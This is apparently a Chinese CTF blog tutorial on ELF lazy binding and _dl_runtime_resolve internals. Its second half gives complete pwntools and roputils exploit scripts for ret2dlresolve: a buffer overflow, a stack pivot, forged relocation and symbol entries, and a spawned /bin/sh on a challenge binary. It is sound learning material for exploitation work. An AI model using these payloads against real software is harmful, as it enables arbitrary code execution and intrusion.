<h3 id="dynamic段"><a href="#dynamic段" class="headerlink" title=".dynamic段"></a>.dynamic段</h3><p><u>.dynamic段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象，动态链接符号表的位置（Dynamic Symbol Table)、动态链接重定位表的位置、动态链接字符串表的位置(Dynamic String Table)</u>。也就是说<strong>比如现在想找到Dynamic Symbol Table，就必须先找到.dynamic的地址，才可以去找到Dynamic Symbol Table，因此这个段主要用于寻找与动态链接相关的其他段( .dynsym .dynstr .rela.plt 等段)。</strong>下面是Elf32_Dyn的结构，它由一个类型值即d_tag和一个数值或指针（union是一个联合体，同时定义了一个数值d_val和一个指针d_ptr，但是一次只能存储一个值，因此这个联合体的大小为4字节，而整个结构体Elf32_Dyn为8字节，这个结构以及结构的大小会在一会查看Dynamic Symbols Table和Dynamic String Table的时候派上用场）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword  d_tag;       <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;          <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;          <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<h3 id="动态符号表（Dynamic-Symbol-Table"><a href="#动态符号表（Dynamic-Symbol-Table" class="headerlink" title="动态符号表（Dynamic Symbol Table)"></a>动态符号表（Dynamic Symbol Table)</h3><p>动态符号表中存储了与动态链接相关的符号，而这个段的段名通常叫做“.dynsym”，而对于本模块的内部符号或者私有变量则保存在.symtab这个表，symtab保存了所有的符号，包括.dynsym中的符号。</p>
<p>使用readelf -s 文件名  则可以查看文件中的.dynsym和symtab（如下面两张图片）</p>
<p><img src="/../img/2706180-20220228094602392-459952878.png"></p>
<p><img src="/../img/2706180-20220228094611847-731147180.png"></p>
<h3 id="动态符号字符串表（Dynamic-String-Table"><a href="#动态符号字符串表（Dynamic-String-Table" class="headerlink" title="动态符号字符串表（Dynamic String Table)"></a>动态符号字符串表（Dynamic String Table)</h3><p>跟名字一样，这个表就是保存了符号名的字符串表。而这个表存在的意义是由于Dynamic Symbol Table里记录的都是固定长度的内容，因此它们没办法去描述二进制文件中的任意字符串（也就是我们的函数名称），因此就需要再创立一个表（也就是.dynstr)来存储函数名称的字符串，在.dynsym中的.st_name字段存储了一个偏移，而最后.dynstr段的首地址加上这个偏移量才能找到符号的名称。而_dl_lookup函数最后就是拿着这个符号的名称（也就是函数的名称）去动态链接库里面搜索对应的函数。</p>
<p>在IDA中可以找到这个ELF String Table</p>
<p><img src="/../img/2706180-20220228094622567-442690588.png"></p>
<h2 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h2><ol>
<li><p>首先用<code>link_map</code>（就是_dl_runtime_resolvehand的第一个参数）访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</p>
</li>
<li><p><code>.rel.plt</code>+参数<code>relic_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p>
</li>
<li><p><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></p>
</li>
<li><p><code>.dynstr</code> + <code>sym-&gt;st_name</code>得出符号名 字符串指针</p>
</li>
<li><p>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</p>
</li>
<li><p>最后调用这个函数</p>
</li>
</ol>
<p>这里我以scanf函数的调用来演示一下（随便找个程序就可以一起做了）</p>
<p>此时即将调用scanf，我们进入内部看一下</p>
<p><img src="/../img/2706180-20220228094633543-1760861108.png"></p>
<p>发现刚进去，就要让跳到0x0804a028所指向的地址（注意这里并不是跳到0x0804a028，而是跳到0x0804a028所指向的地址），我们先看一下0x0804a028指向的哪</p>
<p><img src="/../img/2706180-20220228094641752-2061093355.png"></p>
<p>发现指向的就是下一条指令的地址，这也就顺应了延迟绑定的流程图中的步骤②</p>
<p><img src="/../img/2706180-20220228094649241-866430968.png"></p>
<p>也可以发现此时的got表中scanf的地址写的就是0x080484b6，而这并不是scanf函数的真实地址。<br><img src="/../img/2706180-20220228094656078-12744920.png"></p>
<p>然后发现push了一个0x38，此时我们还不知道这是什么，先不管它。</p>
<p>发现此时准备跳转到地址0x8048430，然后跳到0x08048430，<strong>其实此时你会注意到这个地址距离当前指令的地址是很近的（再看下延迟绑定的流程图会发现其实现在就是步骤④）</strong>，然后接下来是一个push，一个jmp，我们分别看下push和jmp的内容</p>
<p><img src="/../img/2706180-20220228094703865-691204009.png"></p>
<p>可以发现push的是一个地址，而jmp则是跳到了_dl_runtime_resolve（此时完成的是延迟绑定流程图的步骤⑥）</p>
<p><img src="/../img/2706180-20220228094710868-1046942444.png"></p>
<p><img src="/../img/2706180-20220228094718808-1062991369.png"></p>
<p>此时才发现，准备跳到_dl_runtime_resolve的时候，之前压栈的两个原来是参数，因此栈顶的这个地址0xf7ffd940就是参数link_map，而0x38则是参数reloc_index。</p>
<p><img src="/../img/2706180-20220228094727908-1299586145.png"></p>
<p>因此我们先通过link_map去找到.dynamic的地址，这里第三个地址就是.dynamic的地址，不过为什么是第三个地址，而不能是别的地址？（参考下面的解释，怎么用怎么用link_map访问到.dynamic的地址的？）<br><img src="/../img/2706180-20220228094734973-1296358547.png"></p>
<h3 id="怎么用link-map访问到-dynamic的地址的？"><a href="#怎么用link-map访问到-dynamic的地址的？" class="headerlink" title="怎么用link_map访问到.dynamic的地址的？"></a>怎么用link_map访问到.dynamic的地址的？</h3><p>link_map的源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;    <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;      <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以发现在第三个成员 *l_ld这里存储的是Dynamic段地址，因此我们去查找link_map结构体中第三个的地址就是.dynamic的地址了</p>
<p>现在要分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址了，它们处于什么位置？</p>
<p>我们先用readelf -d 看一下.dynamic段的内容</p>
<p><img src="/../img/2706180-20220228094743012-658911024.png"></p>
<p><strong>发现了.dynstr、.dynsym和rel.plt的位置，分别是位于了偏移9，偏移10，和偏移17的位置，又结合最前面提到的结构体Elf32_Dyn为8字节，并且实际的值或者指针应该处于后四字节，因此他们应该分别在dynamic段中位于8*9-4&#x3D;0x44，10*8-4&#x3D;0x4c,17*8-4&#x3D;0x84偏移处</strong>（这里要减去4字节是因为我计算的是不包括他们身处当前位置的字节，而前面计算偏移9、10、17的时候，包括了他们身处当前位置的偏移）因此这里去看下.dynamic段的内容，然后取出对应偏移的内容就是我们要找的.dynstr、dynsym、rel.plt。</p>
<p><img src="/../img/2706180-20220228094750474-266299948.png"></p>
<p>然后用rel.plt的值加上参数reloc_index，就是重定位表项Elf32_Rel的指针，即0x080483c4+0x38&#x3D;0x80483fc。</p>
<p><img src="/../img/2706180-20220228094758713-328537999.png"></p>
<p>下面是Elf32_Rel的结构，对应上图来看，因此r_offset&#x3D;0x804A028<strong>（而这个r_offset就是got.plt的地址，<font color=red>就是说最后解析之后真实的地址会填写进r_offset所指向的地方）</font></strong>,r_info&#x3D;0x907。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr   r_offset;     <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word   r_info;          <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>而将r_info&gt;&gt;8作为dynsym的下标，即0x907&gt;&gt;8&#x3D;9</p>
<p><img src="/../img/2706180-20220228094808547-1115623759.png"></p>
<p>此时它的地址为0x08048268，我们看下Elf32_Sym的源码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>发现在第一个成员st_name存储的就是字符串表的索引（这里我感觉理解成偏移更合适），也就是说符号表的一个内容存储的就是.dynstr距离所需要函数名称的偏移。</p>
<p>那我们看一下0x08048268地址的内容，发现了偏移是0x1a<br><img src="/../img/2706180-20220228094819076-1553870020.png"></p>
<p>因此最终的st_name的地址为.dynstr的地址加上之前拿到的.dynstr的索引，即0x080482a8+0x1a&#x3D;0x080482c2,</p>
<p>最终也是成功找到.dynstr中的scanf函数名字的存储地址。<br><img src="/../img/2706180-20220228094826126-1150418789.png"></p>
<p>接下来就会调用_dl_lookup_symbol_x函数，去动态库里进行遍历搜索，可以看见下图的第一个参数就是我们要搜索的函数名称</p>
<p><img src="/../img/2706180-20220228094834270-1905443385.png"></p>
<h2 id="倒推整个过程，增强整体的逻辑性"><a href="#倒推整个过程，增强整体的逻辑性" class="headerlink" title="倒推整个过程，增强整体的逻辑性"></a>倒推整个过程，增强整体的逻辑性</h2><p>然后上面说明的是具体的实现过程，但是彼此因果性可能不是特别强，下面我再倒推一遍，目的是为了让你知道每一步都在干什么。</p>
<p><strong>我们需要拿到我们要找的函数名字（它是个字符串，而我们要拿到这个字符串的首地址），然后把它交给_dl_lookup_symbol_x,让这个函数去动态库里面搜索，找到我们想延迟绑定的函数，然后把地址再填写到got.plt里面</strong></p>
<p>那现在唯一的问题就是我们怎么拿到这个函数的名字的字符串？<br><strong>这个字符串放在.dynstr（动态符号字符串表）了里面，那我们现在需要两个东西，<font color=red>一个是.dynstr的首地址，一个是我们所需要的字符串距离.dynstr首地址的偏移</font>，才能准确的去找到我们需要的函数名字</strong></p>
<p>那现在的问题就是这两个东西怎么找？</p>
<h3 id="①先说-dynstr的首地址"><a href="#①先说-dynstr的首地址" class="headerlink" title="①先说.dynstr的首地址"></a><strong>①先说.dynstr的首地址</strong></h3><p><strong>在.dynamic段里存储了动态链接器所需要的基本信息，而这其中就包含了.dynstr的位置</strong>，也就是说如果现在找到了.dynamic的地址，查看里面的内容即可找到.dynstr的位置<br>那现在的问题就是去找.dynamic的地址。<br>而观察了link_map的结构，<strong>发现link_map结构体中第三个内容存放的就是.dynamic的地址</strong><br>因此我们只需要去查看一下link_map的内容，然后第三个内容就是我们要找的东西了，<strong>而link_map我们是知道的，因为它就是执行_dl_runtime_resolve函数时的第一个参数link_map_obj。</strong><br>如此再推回去，就可以知道.dynstr的地址了</p>
<h3 id="②再说一下相对于-dynstr首地址的偏移怎么找"><a href="#②再说一下相对于-dynstr首地址的偏移怎么找" class="headerlink" title="②再说一下相对于.dynstr首地址的偏移怎么找"></a><strong>②再说一下相对于.dynstr首地址的偏移怎么找</strong></h3><p>通过阅读<strong>Elf32_Sym</strong>的源码，发现<strong>它这个结构体中第一个成员存储的就是我们要找的偏移</strong><br>而<strong>这个结构又存储在.dynsym（动态符号表）中</strong>（每个函数都有一个自己单独的Elf32_Sym结构）<br>因此<strong>我们可以在.dynsym中找到我们想要的Elf32_Sym结构</strong>，可是又出现了两个问题。<br><strong><font color=red>每个函数都有一个这个结构，那我们怎么去.dynsym中找到我们要找的这个函数的结构？并且.dynsym的地址怎么找？</font></strong></p>
<h4 id="先解决第二个问题"><a href="#先解决第二个问题" class="headerlink" title="先解决第二个问题"></a>先解决第二个问题</h4><p><strong>.dynsym的地址也在上面提到的.dynamic段中存储了</strong>，而上面我们已经说了怎么找.dynamic段的地址，因此这个.dynsym的地址已经被我们知道了</p>
<h4 id="然后解决第一个问题，我们怎么在-dynsym中找到我们要找的那个函数的结构？"><a href="#然后解决第一个问题，我们怎么在-dynsym中找到我们要找的那个函数的结构？" class="headerlink" title="然后解决第一个问题，我们怎么在.dynsym中找到我们要找的那个函数的结构？"></a>然后解决第一个问题，我们怎么在.dynsym中找到我们要找的那个函数的结构？</h4><p><strong>找到这个结构其实也只是需要拿到它距离.dynsym首地址的偏移即可，而这个偏移需要去找到rel.plt表</strong>，这个表是由Elf32_Rel结构体组成，而<strong>将它的第二个成员存储的内容算术右移八位，得到的数值就是我们要找的结构距离.dynsym的偏移</strong><br>现在的问题又是要去找rel.plt表，不过好在<strong>rel.plt也位于.dynamic段</strong>，**<font color=red>由于每个Elf32_Rel的结构体又都对应一个函数，因此怎么去找到我们需要的那个Elf32_Rel呢？</font>**<br>又要用到偏移，而这个偏移我们不需要找了，因为<strong>这个偏移就是_dl_runtime_resolve的第二个参数reloc_index</strong>，如此推回去，也就知道了我们需要的.dynstr首地址的偏移了。</p>
<h2 id="dl-runtime-resolve函数运作的流程图"><a href="#dl-runtime-resolve函数运作的流程图" class="headerlink" title="_dl_runtime_resolve函数运作的流程图"></a>_dl_runtime_resolve函数运作的流程图</h2><p>把上面的倒推过程画成图就是这个样子。<br><img src="/../img/2706180-20220228094846054-1801078117.png"></p>
<h1 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h1><p>通过阅读上面的所有内容，其实是可以发现，最后<strong>_dl_lookup_symbol_x</strong>函数会去搜索字符串是有问题的，因为这个函数<strong>并不在乎你给的字符串是否是你此刻在延迟绑定的函数</strong>，即使这个字符串是别的函数的名称，它依旧会去搜索，<strong>并且动态装载器并不会去检查重定位表的边界，即使你的_dl_runtime_resolve函数第二个参数是极大的，此时的偏移已经超过了rel,plt段的范围</strong>，装载器也依旧是认为这只是一个很大的rel.plt偏移，它不认为这个偏移超过了rel.plt段，最重要的就是<strong>32位程序里面，是用的栈传参，因此这就意味着_dl_runtime_resolve的第二个参数是可以被伪造的</strong>，综上所述，<font color=red>我们就可以伪造一个很大的 reloc_index,让原本偏移到rel.plt段的reloc_index偏移到我们伪造的可控内存，然后我们就可以伪造一系列的结构，最终让距离dynstr段首的偏移指向我们指定的字符串（也就是伪造了字符串），至此_dl_lookup_symbol函数就去搜索到了我们指定的函数。</font></p>
<h1 id="实战ret2dlresolve"><a href="#实战ret2dlresolve" class="headerlink" title="实战ret2dlresolve"></a>实战ret2dlresolve</h1><h2 id="手动构造exp探究原理"><a href="#手动构造exp探究原理" class="headerlink" title="手动构造exp探究原理"></a>手动构造exp探究原理</h2><p>我感觉ret2dlresolve的情况只适用于没有打印函数的程序，毕竟有了打印函数就可以直接用ret2libc了，因此这里我以只有一个read函数的题目来演示一下</p>
<p><img src="/../img/2706180-20220228094854685-707283332.png"></p>
<p><img src="/../img/2706180-20220228094901516-535707583.png"></p>
<p>发现只有一个read函数，然后存在溢出，然后就啥都没有了，没有system函数，没有参数。像这种情况就考虑ret2dlresolve的方法了。</p>
<p>接下来我直接就上exp了，详细解释都在exp里面。（里面有的要用到图片解释的地方，我有进行标注，请参考最下面的补充内容）<br>题目我上传到网盘上了 链接<a href="https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa">https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa</a>  提取码ykpa</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址，就是把每个段的首地址都给赋值给变量</span></span><br><span class="line"><span class="comment">#当然了，你要是想去ida里面一个一个手动找出来，也完全没问题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">44</span><span class="comment">#这个偏移没啥好说的了，ida或者gdb都能得到</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x080485d8</span><span class="comment">#这里采用的是连续pop四次的gadget地址</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804854A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的</span></span><br><span class="line"><span class="comment">#因此我们选择迁移到这里（具体参考补充①）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面</span></span><br><span class="line"><span class="comment">#（因为只考虑最后一位的话范围只是在16字节以内（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?</span></span><br><span class="line"><span class="comment">#因为system上面还有一个Elf32_Sym的结构，这个结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个12是可以在IDA里面通过dynsym来查到（具体参考补充②）</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#这个就是伪造的Elf32_Sym结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+24的偏移也就是执行_dl_runtime_resolve的第二个参数</span></span><br><span class="line"><span class="comment">#而加24的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续四个pop把栈顶的内容给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line"><span class="comment">#这里采用四个pop的原因是因为如果采用三个pop的话，第三个pop是弹给了ebp，这样迁移的话就会出现问题，</span></span><br><span class="line"><span class="comment">#因此我用了四个pop前三个清空栈顶的参数，后一个pop去改变ebp的值，为了正常的完成栈迁移</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span><span class="comment">#这里如果用base_addr的时候，会出现问题，调试的时候发现dl_fixup的时候发现</span></span><br><span class="line"><span class="comment">#里面push了一个ecx，（这个ecx）被用来当做dl_fixup的参数（link_map)，这个ecx就是我们第二次输入的首地址</span></span><br><span class="line"><span class="comment">#如果首地址里面装了4个a的话，就会出现错误（因为参数link_map怎么能是4个a呢），通过调试发现，link_map本身正常的</span></span><br><span class="line"><span class="comment">#参数就是push了ds:0x0804a004(此时的栈已经迁移过了，调试发现压到的这个栈顶居然就是0x0804a800），因此为了让dl_fixup拿到</span></span><br><span class="line"><span class="comment">#这个正常的参数，我们就要让ecx是0x0804a800，而怎么让这个ecx变成0x0804a800，我们只能是read输入的第二个参数</span></span><br><span class="line"><span class="comment">#设置成0x0804a800才可以，而我们迁移之后还想让0x0804a800这里的数据是正常的，那就只能迁移到的地址调高0x4个字节，这样</span></span><br><span class="line"><span class="comment">#迁移过来的时候，栈顶（也就是0x0804a800）依然是正常的link_map</span></span><br><span class="line"><span class="comment">#（如果不太理解我说的是什么意思的话，自己可以把base_addr-4改成base_addr用gdb调试一下就知道了）</span></span><br><span class="line">payload1+=p32(leave_ret_addr)<span class="comment">#如果不知道这里为什么要用leave_ret_addr的话</span></span><br><span class="line"><span class="comment">#建议再学习一下栈迁移，我的博客上有一篇详细介绍了栈迁移的文章</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#payload2=&#x27;aaaa&#x27;#上面采用了抬高0x4字节，因此这里不用再填充垃圾数据了，以便让dl_fixup正常执行</span></span><br><span class="line">payload2=p32(plt0)<span class="comment">#这个plt0和下面的reloc_index，他们共同组成了read_plt（具体参考下面的补充③）</span></span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#这四个b就是返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置，也就是/bin/sh的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt<span class="comment">#开始放置伪造的rel.plt表</span></span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span><span class="comment">#保证fake_sym是对齐了16字节</span></span><br><span class="line">payload2+=fake_sym<span class="comment">#伪造的Elf32_Sym结构</span></span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span><span class="comment">#最终伪造的字符串，让dl_lookup_symbol_x去搜索这个字符串</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>补充①</p>
<p><img src="/../img/2706180-20220228094915257-286002672.png"></p>
<p>补充②</p>
<p><img src="/../img/2706180-20220228094921502-932826454.png"></p>
<p>补充③</p>
<p><img src="/../img/2706180-20220228094929697-1836063513.png"></p>
<p>payload2&#x3D;p32(plt0)<br>payload2+&#x3D;p32(reloc_index)</p>
<p>这两步对应的就是图中标注的两步，这也就是plt在干的事情（因此你可以把这两步等同于p32(read_plt_addr)）</p>
<h2 id="工具攻击"><a href="#工具攻击" class="headerlink" title="工具攻击"></a>工具攻击</h2><p>另外也可以采用Roputil工具，进行攻击，这个工具的威力是很大的，我们根本不需要改什么东西，只要换个偏移和程序名，然后就一把梭了。工具在此下载<a href="https://github.com/inaz2/roputils">https://github.com/inaz2/roputils</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)<span class="comment">#这个rop，就可以理解成elf，这里就是获取了bss段首地址</span></span><br><span class="line">buf = rop.fill(offset)<span class="comment">#填充垃圾数据</span></span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)<span class="comment">#添加一个调用，调用了read函数，后面是它的参数</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)<span class="comment">#第一个参数为伪造的link_map，第二个则是被劫持调用</span></span><br><span class="line"><span class="comment">#函数的参数（system），也就是/bin/sh的位置</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#先存入/bin/sh字符串，使其位于bss_base的位置</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数是伪造的link_map首地址（就是system函数名放的位置），第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BUUCTF上的xdctf2015-pwn200"><a href="#BUUCTF上的xdctf2015-pwn200" class="headerlink" title="BUUCTF上的xdctf2015_pwn200"></a>BUUCTF上的xdctf2015_pwn200</h2><p><img src="/../img/2706180-20220228175843037-1667392941.png"></p>
